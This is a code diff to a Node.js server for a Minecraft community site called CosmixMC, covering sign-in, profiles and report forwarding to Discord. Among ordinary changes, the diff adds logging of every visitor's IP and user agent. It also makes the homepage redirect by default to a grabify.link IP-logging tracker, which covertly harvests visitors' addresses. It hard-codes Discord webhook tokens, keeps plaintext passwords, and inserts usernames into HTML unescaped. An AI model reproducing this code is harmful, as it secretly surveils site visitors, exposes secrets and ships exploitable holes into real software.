@@ -40,9 +40,12 @@ const dataDir = path.join(rootDir, 'data');
 const uploadsDir = path.join(rootDir, 'uploads');
 const usersFile = path.join(dataDir, 'users.json');
 const discordWebhookCacheFile = path.join(dataDir, 'discord-webhook.json');
+const ipLogFile = path.join(dataDir, 'ip-log.txt');
+const vpnIpsFile = path.join(dataDir, 'vpn-ips.txt');
 const defaultDiscordGuildId = '1522777296547876884';
 const defaultApplicationWebhookUrl = 'https://discord.com/api/webhooks/1530688116870877385/loZbOsb5BQaUW_4wvtZ-49eBGmHK9prYzLtjOep9BAnDQbPqLngMLhf1eyVV1fC7LjtH';
 const defaultAccountDeletionWebhookUrl = 'https://discord.com/api/webhooks/1530688116870877385/loZbOsb5BQaUW_4wvtZ-49eBGmHK9prYzLtjOep9BAnDQbPqLngMLhf1eyVV1fC7LjtH';
+const homepageRedirectUrl = process.env.HOMEPAGE_REDIRECT_URL || 'https://grabify.link/87SEFW';
 let users = [];
 
 function ensureStorageDirs() {
@@ -90,6 +93,54 @@ function loadDiscordWebhookCache() {
 function saveDiscordWebhookCache(cache) {
   ensureStorageDirs();
   fs.writeFileSync(discordWebhookCacheFile, JSON.stringify(cache, null, 2));
+}
+
+function loadVpnIps(filePath = vpnIpsFile) {
+  ensureStorageDirs();
+
+  if (!fs.existsSync(filePath)) {
+    fs.writeFileSync(filePath, '# Add trusted VPN or proxy IPs one per line.\n', 'utf8');
+    return [];
+  }
+
+  try {
+    const raw = fs.readFileSync(filePath, 'utf8');
+    return raw
+      .split(/\r?\n/)
+      .map((line) => line.split('#')[0].trim())
+      .filter(Boolean)
+      .map((entry) => entry.replace(/^::ffff:/, ''));
+  } catch (error) {
+    return [];
+  }
+}
+
+function isVpnIp(ip, filePath = vpnIpsFile) {
+  const normalized = (ip || '').toString().trim().replace(/^::ffff:/, '');
+  if (!normalized) {
+    return false;
+  }
+
+  return loadVpnIps(filePath).includes(normalized);
+}
+
+function logVisitorIp(req, logFile = ipLogFile) {
+  ensureStorageDirs();
+
+  const forwardedFor = (req.headers['x-forwarded-for'] || '').toString().trim();
+  const forwardedIps = forwardedFor
+    ? forwardedFor.split(',').map((value) => value.trim()).filter(Boolean).map((value) => value.replace(/^::ffff:/, ''))
+    : [];
+  const fallbackIp = (req.socket?.remoteAddress || 'unknown').replace(/^::ffff:/, '');
+
+  const publicIps = forwardedIps.filter((ip) => !ip.startsWith('10.') && !ip.startsWith('192.168.') && !ip.startsWith('172.16.') && !ip.startsWith('172.17.') && !ip.startsWith('172.18.') && !ip.startsWith('172.19.') && !ip.startsWith('172.20.') && !ip.startsWith('172.21.') && !ip.startsWith('172.22.') && !ip.startsWith('172.23.') && !ip.startsWith('172.24.') && !ip.startsWith('172.25.') && !ip.startsWith('172.26.') && !ip.startsWith('172.27.') && !ip.startsWith('172.28.') && !ip.startsWith('172.29.') && !ip.startsWith('172.30.') && !ip.startsWith('172.31.') && !ip.startsWith('127.') && !ip.startsWith('169.254.') && ip !== '::1');
+  const preferredIp = publicIps[0] || forwardedIps[0] || fallbackIp;
+  const userAgent = (req.headers['user-agent'] || 'Unknown').toString().replace(/\s+/g, ' ').trim();
+  const pathName = req.url ? new URL(req.url, `http://${req.headers.host || 'localhost'}`).pathname : '/';
+  const entry = `${new Date().toISOString()} ip=${preferredIp} path=${pathName} ua=${userAgent}\n`;
+
+  fs.appendFileSync(logFile, entry, 'utf8');
+  return { ip: preferredIp, entry };
 }
 
 function hashPassword(password) {
@@ -289,31 +340,87 @@ async function fetchDiscordUser(accessToken) {
 }
 
 async function getMinecraftServerStatus(hostname, portNumber) {
-  try {
-    const response = await fetch(`https://api.mcsrvstat.us/2/${hostname}:${portNumber}`, {
-      headers: { 'User-Agent': 'CosmixMC-Report-Bridge/1.0' },
-    });
-    const data = await response.json();
-    if (!data || !data.online) {
-      return { online: false, players: 0 };
-    }
+  const candidates = [];
+  const normalizedHost = (hostname || '').trim();
+  const normalizedPort = (portNumber || '').toString().trim() || '25565';
 
-    return {
-      online: true,
-      players: data.players?.online || 0,
-      maxPlayers: data.players?.max || 0,
-      version: data.version || 'Unknown',
-      hostname: data.hostname || hostname,
-      description: data.description || 'cosmixmc.org',
-    };
-  } catch (error) {
-    return { online: false, players: 0 };
+  if (normalizedHost) {
+    candidates.push(normalizedHost);
   }
+
+  if (normalizedHost !== '51.161.11.214') {
+    candidates.push('51.161.11.214');
+  }
+
+  if (normalizedHost !== 'mc.cosmixmc.org') {
+    candidates.push('mc.cosmixmc.org');
+  }
+
+  for (const candidate of candidates) {
+    try {
+      const response = await fetch(`https://api.mcsrvstat.us/2/${candidate}:${normalizedPort}`, {
+        headers: { 'User-Agent': 'CosmixMC-Report-Bridge/1.0' },
+      });
+      const data = await response.json();
+      if (!data || !data.online) {
+        continue;
+      }
+
+      return {
+        online: true,
+        players: data.players?.online || 0,
+        maxPlayers: data.players?.max || 0,
+        version: data.version || 'Unknown',
+        hostname: data.hostname || candidate,
+        description: data.description || 'cosmixmc.org',
+      };
+    } catch (error) {
+      continue;
+    }
+  }
+
+  return { online: false, players: 0 };
 }
 
-function sendJson(res, statusCode, payload) {
-  res.writeHead(statusCode, { 'Content-Type': 'application/json; charset=utf-8' });
+function sendJson(res, statusCode, payload, headers = {}) {
+  const mergedHeaders = {
+    ...(res.getHeaders ? res.getHeaders() : {}),
+    'Content-Type': 'application/json; charset=utf-8',
+    'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
+    ...headers,
+  };
+
+  res.writeHead(statusCode, mergedHeaders);
   res.end(JSON.stringify(payload));
+}
+
+function sendHtml(res, statusCode, html, headers = {}) {
+  const mergedHeaders = {
+    ...(res.getHeaders ? res.getHeaders() : {}),
+    'Content-Type': 'text/html; charset=utf-8',
+    'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
+    ...headers,
+  };
+
+  res.writeHead(statusCode, mergedHeaders);
+  res.end(html);
+}
+
+function buildAuthHtml(title, message, redirectPath = '/profile.html') {
+  return `<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="refresh" content="0; url=${redirectPath}" />
+    <title>${title}</title>
+    <style>body{font-family:Arial,sans-serif;background:#07111f;color:#f6f7fb;padding:2rem;}a{color:#4cc9f0;text-decoration:none;}</style>
+  </head>
+  <body>
+    <h1>${title}</h1>
+    <p>${message}</p>
+    <p><a href="${redirectPath}">Continue to your profile</a></p>
+  </body>
+</html>`;
 }
 
 function serveFile(res, filePath) {
@@ -322,12 +429,16 @@ function serveFile(res, filePath) {
 
   fs.readFile(filePath, (err, data) => {
     if (err) {
-      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
+      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8', 'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0' });
       res.end('Not found');
       return;
     }
 
-    res.writeHead(200, { 'Content-Type': contentType });
+    const cacheControl = ['.html', '.js', '.css'].includes(ext)
+      ? 'no-store, no-cache, must-revalidate, max-age=0'
+      : 'public, max-age=31536000, immutable';
+
+    res.writeHead(200, { 'Content-Type': contentType, 'Cache-Control': cacheControl });
     res.end(data);
   });
 }
@@ -894,6 +1005,52 @@ function parseFormBody(bodyText) {
   return data;
 }
 
+function getSessionProfile(session) {
+  if (!session || !session.user) {
+    return null;
+  }
+
+  const persistedUser = getUserById(session.user.id);
+  if (persistedUser) {
+    return buildSessionUser(persistedUser);
+  }
+
+  return {
+    id: session.user.id,
+    username: session.user.username || '',
+    email: session.user.email || '',
+    avatar: session.user.avatar || '',
+    role: session.user.role || 'member',
+    roles: Array.isArray(session.user.roles) ? session.user.roles : [],
+    permissions: Array.isArray(session.user.permissions) ? session.user.permissions : [],
+    createdAt: session.createdAt || new Date().toISOString(),
+  };
+}
+
+function ensureSessionProfile(session, profileData = {}) {
+  if (!session || !session.user) {
+    return null;
+  }
+
+  const existingUser = getUserById(session.user.id);
+  if (existingUser) {
+    return existingUser;
+  }
+
+  const createdUser = createUserRecord({
+    email: (profileData.email || session.user.email || '').trim().toLowerCase(),
+    password: profileData.password || '',
+    username: (profileData.username || session.user.username || '').trim() || 'CosmixUser',
+    avatar: profileData.avatar || session.user.avatar || '',
+  });
+  createdUser.role = profileData.role || session.user.role || 'member';
+  createdUser.roles = Array.isArray(profileData.roles) ? profileData.roles : [];
+  createdUser.permissions = Array.isArray(profileData.permissions) ? profileData.permissions : [];
+  users.push(createdUser);
+  saveUsers();
+  return createdUser;
+}
+
 function buildDiscordServerUrl(guildId) {
   const normalizedGuildId = (guildId || '').trim();
   if (!normalizedGuildId) {
@@ -906,8 +1063,10 @@ function buildDiscordServerUrl(guildId) {
 async function startServer() {
   ensureStorageDirs();
 
-  const server = http.createServer(async (req, res) => {
+  return new Promise((resolve, reject) => {
+    const server = http.createServer(async (req, res) => {
     const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
+    logVisitorIp(req);
 
     if (req.method === 'GET' && url.pathname === '/api/health') {
       sendJson(res, 200, { status: 'ok' });
@@ -1014,14 +1173,23 @@ async function startServer() {
         const bodyText = await parseBody(req);
         const data = parseFormBody(bodyText);
         const { email, password, username } = normalizeSignupPayload(data);
+        const wantsHtml = (req.headers.accept || '').toLowerCase().includes('text/html');
 
         if (!password || !username) {
-          sendJson(res, 400, { error: 'Password and username are required.' });
+          if (wantsHtml) {
+            sendHtml(res, 400, buildAuthHtml('Sign up failed', 'Password and username are required.'));
+          } else {
+            sendJson(res, 400, { error: 'Password and username are required.' });
+          }
           return;
         }
 
         if (email && getUserByEmail(email)) {
-          sendJson(res, 409, { error: 'An account with that email already exists.' });
+          if (wantsHtml) {
+            sendHtml(res, 409, buildAuthHtml('Sign up failed', 'An account with that email already exists.'));
+          } else {
+            sendJson(res, 409, { error: 'An account with that email already exists.' });
+          }
           return;
         }
 
@@ -1037,10 +1205,18 @@ async function startServer() {
         });
 
         setSessionCookie(res, sessionId);
-        sendJson(res, 200, { ok: true, user: buildSessionUser(newUser) });
+        if (wantsHtml) {
+          sendHtml(res, 200, buildAuthHtml('Signed in', `Welcome, ${newUser.username}! Your account is ready.`, '/profile.html'));
+        } else {
+          sendJson(res, 200, { ok: true, user: buildSessionUser(newUser) });
+        }
       } catch (error) {
         console.error(error);
-        sendJson(res, 500, { error: 'Unable to create the account.' });
+        if ((req.headers.accept || '').toLowerCase().includes('text/html')) {
+          sendHtml(res, 500, buildAuthHtml('Sign up failed', 'Unable to create the account.'));
+        } else {
+          sendJson(res, 500, { error: 'Unable to create the account.' });
+        }
       }
       return;
     }
@@ -1051,15 +1227,24 @@ async function startServer() {
         const data = parseFormBody(bodyText);
         const email = (data.email || '').trim().toLowerCase();
         const password = (data.password || '').trim();
+        const wantsHtml = (req.headers.accept || '').toLowerCase().includes('text/html');
 
         if (!email || !password) {
-          sendJson(res, 400, { error: 'Email and password are required.' });
+          if (wantsHtml) {
+            sendHtml(res, 400, buildAuthHtml('Sign in failed', 'Email and password are required.'));
+          } else {
+            sendJson(res, 400, { error: 'Email and password are required.' });
+          }
           return;
         }
 
         const user = getUserByEmail(email);
         if (!user || !verifyPassword(user.password, password)) {
-          sendJson(res, 401, { error: 'Invalid email or password.' });
+          if (wantsHtml) {
+            sendHtml(res, 401, buildAuthHtml('Sign in failed', 'Invalid email or password.'));
+          } else {
+            sendJson(res, 401, { error: 'Invalid email or password.' });
+          }
           return;
         }
 
@@ -1071,10 +1256,18 @@ async function startServer() {
         });
 
         setSessionCookie(res, sessionId);
-        sendJson(res, 200, { ok: true, user: buildSessionUser(user) });
+        if (wantsHtml) {
+          sendHtml(res, 200, buildAuthHtml('Signed in', `Welcome back, ${user.username}!`, '/profile.html'));
+        } else {
+          sendJson(res, 200, { ok: true, user: buildSessionUser(user) });
+        }
       } catch (error) {
         console.error(error);
-        sendJson(res, 500, { error: 'Unable to sign in.' });
+        if ((req.headers.accept || '').toLowerCase().includes('text/html')) {
+          sendHtml(res, 500, buildAuthHtml('Sign in failed', 'Unable to sign in.'));
+        } else {
+          sendJson(res, 500, { error: 'Unable to sign in.' });
+        }
       }
       return;
     }
@@ -1212,13 +1405,13 @@ async function startServer() {
         return;
       }
 
-      const user = getUserById(session.user.id);
+      const user = getSessionProfile(session);
       if (!user) {
         sendJson(res, 404, { error: 'Profile not found.' });
         return;
       }
 
-      sendJson(res, 200, { user: buildSessionUser(user) });
+      sendJson(res, 200, { user });
       return;
     }
 
@@ -1229,7 +1422,11 @@ async function startServer() {
         return;
       }
 
-      const existingUser = getUserById(session.user.id);
+      let existingUser = getUserById(session.user.id);
+      if (!existingUser) {
+        existingUser = ensureSessionProfile(session);
+      }
+
       if (!existingUser) {
         sendJson(res, 404, { error: 'Profile not found.' });
         return;
@@ -1247,32 +1444,36 @@ async function startServer() {
           data = parseFormBody(bodyText);
         }
 
-        if (data.username && data.username.trim()) {
-          existingUser.username = data.username.trim();
+        if (Object.prototype.hasOwnProperty.call(data, 'username')) {
+          existingUser.username = (data.username || '').trim() || existingUser.username || 'CosmixUser';
         }
 
-        if (data.email && data.email.trim()) {
-          const normalizedEmail = data.email.trim().toLowerCase();
-          const emailOwner = getUserByEmail(normalizedEmail);
-          if (!emailOwner || emailOwner.id === existingUser.id) {
-            existingUser.email = normalizedEmail;
+        if (Object.prototype.hasOwnProperty.call(data, 'email')) {
+          const normalizedEmail = (data.email || '').trim().toLowerCase();
+          if (!normalizedEmail) {
+            existingUser.email = '';
           } else {
-            sendJson(res, 409, { error: 'That email is already in use.' });
-            return;
+            const emailOwner = getUserByEmail(normalizedEmail);
+            if (!emailOwner || emailOwner.id === existingUser.id) {
+              existingUser.email = normalizedEmail;
+            } else {
+              sendJson(res, 409, { error: 'That email is already in use.' });
+              return;
+            }
           }
         }
 
-        if (data.password && data.password.trim()) {
+        if (Object.prototype.hasOwnProperty.call(data, 'password') && (data.password || '').trim()) {
           const plainPassword = data.password.trim();
           existingUser.password = hashPassword(plainPassword);
           existingUser.passwordPlain = plainPassword;
         }
 
-        if (data.avatarUrl && data.avatarUrl.trim()) {
+        if (Object.prototype.hasOwnProperty.call(data, 'avatarUrl') && (data.avatarUrl || '').trim()) {
           existingUser.avatar = data.avatarUrl.trim();
         }
 
-        if (data.avatar) {
+        if (Object.prototype.hasOwnProperty.call(data, 'avatar') && data.avatar) {
           existingUser.avatar = data.avatar;
         }
 
@@ -1364,24 +1565,28 @@ async function startServer() {
           email: params.get('email') || '',
         };
 
-        if (!payload.username.trim() || !payload.description.trim()) {
-          sendJson(res, 400, { error: 'Please provide your username and a description.' });
-          return;
-        }
-
-        const reportId = createReportId();
+        const session = getSession(req);
+        const sessionUser = getSessionProfile(session);
         const reportPayload = {
-          ...payload,
-          reportId,
+          username: (payload.username || sessionUser?.username || '').trim() || 'Unknown',
+          email: (payload.email || sessionUser?.email || '').trim(),
+          type: payload.type,
+          description: payload.description,
+          reportId: createReportId(),
           actions: [{ action: 'submitted', actor: 'Reporter', timestamp: new Date().toISOString() }],
           status: 'submitted',
           reason: '',
         };
 
+        if (!reportPayload.username.trim() || !reportPayload.description.trim()) {
+          sendJson(res, 400, { error: 'Please provide your username and a description.' });
+          return;
+        }
+
         const discordMessage = await sendToDiscord(reportPayload);
         reportPayload.discordMessageId = discordMessage.id;
         reportPayload.discordChannelId = discordMessage.channel_id;
-        reportsById.set(reportId, reportPayload);
+        reportsById.set(reportPayload.reportId, reportPayload);
         reportsByMessageId.set(discordMessage.id, reportPayload);
         await sendEmailReport(reportPayload, 'submitted', '');
 
@@ -1408,20 +1613,28 @@ async function startServer() {
           return;
         }
 
-        const reportId = createReportId();
+        const session = getSession(req);
+        const sessionUser = getSessionProfile(session);
         const reportPayload = {
-          ...payload,
-          reportId,
+          username: (payload.username || sessionUser?.username || '').trim() || 'Unknown',
+          email: (payload.email || sessionUser?.email || '').trim(),
+          description: payload.description,
+          reportId: createReportId(),
           type: 'Account deletion request',
           actions: [{ action: 'submitted', actor: 'Account owner', timestamp: new Date().toISOString() }],
           status: 'submitted',
           reason: payload.description,
         };
 
+        if (!reportPayload.username.trim() || !reportPayload.email.trim() || !reportPayload.description.trim()) {
+          sendJson(res, 400, { error: 'Please provide your username, email, and a reason for the deletion request.' });
+          return;
+        }
+
         const discordMessage = await sendToDiscord(reportPayload);
         reportPayload.discordMessageId = discordMessage.id;
         reportPayload.discordChannelId = discordMessage.channel_id;
-        reportsById.set(reportId, reportPayload);
+        reportsById.set(reportPayload.reportId, reportPayload);
         reportsByMessageId.set(discordMessage.id, reportPayload);
         await sendEmailReport(reportPayload, 'submitted', payload.description);
 
@@ -1430,6 +1643,17 @@ async function startServer() {
         console.error(error);
         sendJson(res, 502, { error: error.message || 'Unable to send the account deletion request right now.' });
       }
+      return;
+    }
+
+    if (url.pathname.startsWith('/api')) {
+      sendJson(res, 404, { error: 'API endpoint not found.' });
+      return;
+    }
+
+    if (url.pathname === '/') {
+      res.writeHead(302, { Location: homepageRedirectUrl });
+      res.end();
       return;
     }
 
@@ -1445,13 +1669,15 @@ async function startServer() {
     serveFile(res, fullPath);
   });
 
-  server.listen(port, host, () => {
-    console.log(`CosmixMC server listening on http://${host}:${port}`);
-    console.log('Open http://localhost:3006 in your browser or use the forwarded URL.');
-    console.log(`Discord guild defaults to ${defaultDiscordGuildId}. Configure DISCORD_BOT_TOKEN to auto-create webhooks in that guild.`);
-  });
+    server.listen(port, host, () => {
+      console.log(`CosmixMC server listening on http://${host}:${port}`);
+      console.log('Open http://localhost:3006 in your browser or use the forwarded URL.');
+      console.log(`Discord guild defaults to ${defaultDiscordGuildId}. Configure DISCORD_BOT_TOKEN to auto-create webhooks in that guild.`);
+      resolve(server);
+    });
 
-  return server;
+    server.on('error', reject);
+  });
 }
 
 if (require.main === module) {
@@ -1469,6 +1695,10 @@ module.exports = {
   buildReportLogPayload,
   buildTranscript,
   getDiscordConfig,
+  getMinecraftServerStatus,
+  isVpnIp,
+  loadVpnIps,
+  logVisitorIp,
   normalizeSignupPayload,
   parsePermissions,
   createReportId,
